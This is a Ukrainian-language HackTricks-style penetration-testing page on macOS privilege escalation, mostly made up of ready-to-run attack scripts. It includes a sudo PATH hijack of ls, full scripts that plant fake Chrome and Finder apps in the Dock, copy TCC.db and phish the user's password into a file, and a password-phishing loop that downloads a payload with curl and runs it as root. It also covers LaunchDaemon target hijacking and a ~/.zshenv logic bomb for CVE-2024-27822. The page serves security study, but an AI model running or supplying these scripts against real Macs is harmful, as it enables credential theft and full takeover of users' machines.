# Підвищення привілеїв у macOS

{{#include ../../banners/hacktricks-training.md}}

## Підвищення привілеїв через TCC

Якщо ви перейшли сюди в пошуках підвищення привілеїв через TCC, перейдіть до:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Багато технік підвищення привілеїв, які застосовуються до Linux або інших Unix-подібних систем, також працюють у macOS. Дивіться:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Взаємодія з користувачем

### Sudo Hijacking

Оригінальну [техніку Sudo Hijacking можна знайти в публікації про підвищення привілеїв у Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Однак macOS **зберігає** `**PATH**` користувача, коли він виконує **`sudo`**. Це означає, що іншим способом здійснити цю атаку було б **перехопити інші бінарні файли**, які жертва все одно виконає під час **запуску sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Зверніть увагу, що користувач, який використовує terminal, найімовірніше, має **Homebrew installed**. Тому можливо підмінити binaries у **`/opt/homebrew/bin`**.

### Імітація Dock

За допомогою певної **social engineering** можна **імітувати, наприклад, Google Chrome** у Dock і фактично виконати власний script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Деякі пропозиції:

- Перевірте в Dock, чи є Chrome, і в такому разі **видаліть** цей entry та **додайте** **fake** **Chrome entry на ту саму позицію** в масиві Dock.

<details>
<summary>Скрипт імітації Chrome у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Деякі пропозиції:

- Ви **не можете видалити Finder з Dock**, тому якщо ви збираєтеся додати його до Dock, можна розмістити фальшивий Finder прямо поруч зі справжнім. Для цього потрібно **додати запис фальшивого Finder на початок масиву Dock**.
- Інший варіант — не розміщувати його в Dock, а просто відкрити його: повідомлення "Finder asking to control Finder" не здається таким уже дивним.
- Ще один варіант **підвищити привілеї до root без запиту** пароля з жахливим вікном — змусити Finder справді запитати пароль для виконання привілейованої дії:
- Попросіть Finder скопіювати новий файл **`sudo`** до **`/etc/pam.d`**. (У запиті пароля буде вказано, що "Finder wants to copy sudo".)
- Попросіть Finder скопіювати новий **Authorization Plugin**. (Ви можете керувати назвою файлу, щоб у запиті пароля було вказано, що "Finder wants to copy Finder.bundle".)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Фішинг запиту пароля + повторне використання sudo

Шкідливе ПЗ часто зловживає взаємодією з користувачем, щоб **перехопити пароль, придатний для sudo**, і програмно повторно його використати. Поширений сценарій:

1. Визначити користувача, який увійшов у систему, за допомогою `whoami`.
2. **Зациклити запити пароля**, доки `dscl . -authonly "$user" "$pw"` не поверне успішний результат.
3. Кешувати облікові дані (наприклад, у `/tmp/.pass`) і виконувати привілейовані дії через `sudo -S` (пароль через stdin).

Приклад мінімального ланцюжка:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Викрадений пароль можна повторно використати, щоб **очистити карантин Gatekeeper за допомогою `xattr -c`**, скопіювати LaunchDaemons або інші привілейовані файли та запускати додаткові етапи без взаємодії з користувачем.<sup>[[1]](#references)</sup>

## Новіші специфічні для macOS вектори (2023–2026)

### Застарілий `AuthorizationExecuteWithPrivileges` досі можна використовувати

`AuthorizationExecuteWithPrivileges` був застарілим у версії 10.7, але **досі працює в Sonoma/Sequoia**. Багато комерційних оновлювачів викликають `/usr/libexec/security_authtrampoline` із ненадійним шляхом. Якщо цільовий binary доступний для запису користувачу, можна розмістити троян і скористатися легітимним запитом:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Поєднайте з **наведеними вище прийомами masquerading**, щоб створити правдоподібне діалогове вікно пароля.


### Тріаж привілейованого helper / XPC

Багато сучасних сторонніх macOS privescs дотримуються однакової схеми: **root LaunchDaemon** надає **Mach/XPC service** з **`/Library/PrivilegedHelperTools`**, після чого helper або **не перевіряє клієнта**, або перевіряє його **надто пізно** (PID race), або надає **root method**, що використовує **шлях/скрипт, контрольований користувачем**. Саме цей клас вразливостей лежить в основі багатьох нещодавніх проблем із helper у VPN-клієнтах, game launchers та updaters.<sup>[[2]](#references)</sup>

Короткий чекліст тріажу:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Особливу увагу звертайте на helper-и, які:

- продовжують приймати запити **після uninstall**, оскільки job залишився завантаженим у `launchd`
- виконують scripts або читають configuration з **`/Applications/...`** чи інших шляхів, доступних для запису користувачам без root-привілеїв
- покладаються на перевірку peer-а на основі **PID** або **лише bundle-id**, яку можна обійти через race condition

Докладніше про authorization bugs у helper-ах дивіться на [цій сторінці](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Наслідування середовища scripts у PackageKit (CVE-2024-27822)

До того як Apple виправила це у **Sonoma 14.5**, **Ventura 13.6.7** та **Monterey 12.7.5**, інсталяції, ініційовані користувачем через **`Installer.app`** / **`PackageKit.framework`**, могли виконувати **PKG scripts як root у середовищі поточного користувача**. Це означає, що package з **`#!/bin/zsh`** завантажував **`~/.zshenv`** атакувальника та виконував його як **root**, коли жертва встановлювала package.<sup>[[3]](#references)</sup>

Це особливо цікаво як **logic bomb**: достатньо отримати foothold в обліковому записі користувача та мати доступний для запису shell startup file, після чого чекати, поки користувач запустить будь-який вразливий installer на основі **zsh**. Загалом це **не** стосується розгортань через **MDM/Munki**, оскільки вони виконуються в середовищі root-користувача.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Якщо вам потрібен детальніший розбір зловживань, специфічних для installer, також перегляньте [цю сторінку](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Конфлікт призначення installer через `.localized`

Деякі сторонні installers реєструють кореневий LaunchDaemon, виконуваний файл якого вказано за фіксованим шляхом усередині `/Applications/Target.app`. Якщо зловмисник може спочатку створити цей bundle з **іншим ідентифікатором bundle**, Installer може зберегти приманку та розмістити справжній застосунок у `/Applications/Target.localized/Target.app`. Daemon і надалі вказує на початковий шлях. Отже, контрольований зловмисником виконуваний файл усередині bundle-приманки згодом може запуститися від імені root.<sup>[[8]](#references)</sup>

Важливі передумови такі:<sup>[[8]](#references)</sup>

1. Зловмисник може створити очікуваний шлях до застосунку або контролювати його.
2. Пакет не видаляє конфліктний bundle.
3. Привілейоване завдання використовує жорстко заданий шлях усередині цього bundle.
4. Користувач або workflow MDM встановлює пакет і реєструє завдання.

Шукайте переміщені bundles, а потім перевірте цілі LaunchDaemon за допомогою циклу enumeration у наступному розділі:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Безпечніший інсталятор визначає кінцеве розташування bundle і зберігає привілейовані виконувані файли в місці, власником якого є root, наприклад `/Library/PrivilegedHelperTools`. Він також має перевіряти власника та підпис коду перед реєстрацією або запуском job.<sup>[[8]](#references)</sup>

### Викрадення цілі Writable LaunchDaemon

Файл plist LaunchDaemon може належати root, тоді як його `Program` або перший елемент `ProgramArguments` вказує на каталог, доступний для запису користувачем. Перевіряйте **весь шлях**, а не лише права доступу до виконуваного файлу. Якщо батьківський каталог доступний для запису, attacker може перейменувати виконуваний файл, власником якого є root, і створити replacement за тим самим шляхом. Replacement запускається від root під час наступного запуску job. Достатньо перезавантаження або звичайного перезапуску service. Attacker не потрібен дозвіл на виконання `launchctl bootstrap` у системному домені.<sup>[[7]](#references)</sup>

Спочатку перелічіть кожну ціль і її безпосередній батьківський каталог:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Коли файл або його батьківський каталог доступний для запису, збережіть оригінальний binary та замініть шлях на executable payload. Потім дочекайтеся перезапуску вже завантаженого daemon.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Вразливий шлях `kauth_cred_proc_update` оновлював `proc_ro.p_ucred` за допомогою неатомарного API `zalloc_ro_mut`, тоді як читачі SMR завантажували вказівник без блокування. Публічний тригер використовує спеціально підготовлений setgid-бінарник. Один потік перемикається між реальним і ефективним ідентифікаторами групи, тоді як інший потік багаторазово входить у syscall, наприклад `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Розглядайте це як **race primitive**, а не як готовий root exploit. Опублікований PoC демонструє пошкоджений вказівник на credential. Зазвичай це завершується kernel panic. Дослідник відтворив пошкодження лише на Intel і не продемонстрував детермінований контроль над отриманим credential object. Apple змінила механізм оновлення на атомарний обмін вказівниками в macOS 15.3.<sup>[[4]](#references)</sup>

### SIP bypass через Migration assistant ("Migraine", CVE-2023-32369)

Якщо ви вже маєте root, SIP все одно блокує запис у системні розташування. Вразливість **Migraine** зловживає entitlement Migration Assistant `com.apple.rootless.install.heritable`, щоб створити дочірній процес, який успадковує SIP bypass і перезаписує захищені шляхи (наприклад, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Ланцюжок:

1. Отримати root у запущеній системі.
2. Запустити `systemmigrationd` зі спеціально сформованим станом, щоб виконати бінарний файл, контрольований атакувальником.
3. Використати успадкований entitlement для модифікації файлів, захищених SIP, із збереженням змін навіть після перезавантаження.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Кілька демонів Apple приймають об’єкти **NSPredicate** через XPC і перевіряють лише поле `expressionType`, яким може керувати атакувальник. Створивши predicate, який виконує довільні селектори, можна досягти **code execution у root/system XPC services** (наприклад, `coreduetd`, `contextstored`). У поєднанні з початковим app sandbox escape це забезпечує **privilege escalation без запитів до користувача**. Шукайте XPC endpoints, які десеріалізують predicates і не мають надійного visitor.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Будь-який користувач** (навіть непривілейований) може створити та змонтувати snapshot Time Machine за допомогою `-o noowners` і **отримати доступ до ВСІХ файлів** цього snapshot, обійшовши перевірки власності на активному томі. Єдиний необхідний privilege полягає в тому, щоб застосунок, який використовується (наприклад, `Terminal`), мав **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Команди та повне пояснення наведено на сторінці TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Це може бути корисним для privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025 рік, рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Local Privilege Escalation в AWS Client VPN для macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilege Escalation у macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [SIP bypass "Migraine" від Microsoft (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Новий клас помилок Privilege Escalation у macOS та iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Hijacking LaunchDaemon: privilege escalation і persistence через небезпечні permissions папок](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE через директорію .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
